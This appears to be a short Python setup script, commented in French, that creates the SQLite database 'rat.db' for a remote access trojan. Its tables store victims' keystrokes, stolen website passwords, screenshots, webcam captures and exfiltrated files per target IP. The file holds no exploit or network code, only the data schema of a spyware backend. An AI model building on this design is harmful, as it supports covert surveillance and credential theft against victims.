import sqlite3
import os


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
db_path = os.path.join(BASE_DIR, "rat.db")

# Connexion à la base de données
conn = sqlite3.connect(db_path)
cursor = conn.cursor()

# Création des tables
cursor.execute('''
CREATE TABLE IF NOT EXISTS keystrokes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL,
    target_ip TEXT NOT NULL,
    key_pressed TEXT NOT NULL
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS passwords (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_ip TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    url TEXT NOT NULL,
    username TEXT,
    password TEXT
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS screenshots (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL,
    target_ip TEXT NOT NULL,
    file_path TEXT NOT NULL
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL,
    target_ip TEXT NOT NULL,
    file_name TEXT NOT NULL,
    file_size INTEGER,
    file_path TEXT NOT NULL
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS webcam (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL,
    target_ip TEXT NOT NULL,
    file_path TEXT NOT NULL
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS targets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip_address TEXT NOT NULL UNIQUE,
    hostname TEXT,
    os TEXT
)
''')

# Commit et fermer la connexion
conn.commit()
conn.close()

print(f"Base de données rat.db initialisée avec succès dans {db_path}.")
